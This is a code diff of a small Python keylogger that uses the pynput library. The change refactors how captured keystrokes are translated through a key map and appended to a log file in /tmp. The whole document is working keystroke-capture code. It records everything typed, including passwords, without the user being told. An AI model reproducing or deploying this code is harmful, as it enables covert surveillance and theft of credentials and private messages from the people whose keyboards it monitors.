@@ -1,18 +1,28 @@
-import re
 from pynput.keyboard import Listener
 
-log = "/tmp/keylogger.log"
+arq = "/tmp/keylogger.log"
+key_map = {
+    'Key.enter': '\n',
+    'Key.tab': '    ',
+    'Key.space': ' ',
+    'Key.shift': '',
+    'Key.shift_r': ''
+}
+
+def log(text):
+    with open(arq, "a") as l:
+        l.write(text)
 
 def capture(key):
-    key = str(key)
-    key = re.sub(r'\'', '', key)
-    key = re.sub(r'Key.space', ' ', key)
-    key = re.sub(r'Key.enter', '\n', key)
-    key = re.sub(r'Key.*', '', key)
-    #print(key)
+    try:
+        log(key.char)
 
-    with open(log, "a") as l:
-        l.write(key)
+    except AttributeError:
+        log(key_map[str(key)])   
 
+    except:
+        log(' ')
+    
+    
 with Listener(on_press=capture) as l:
     l.join()
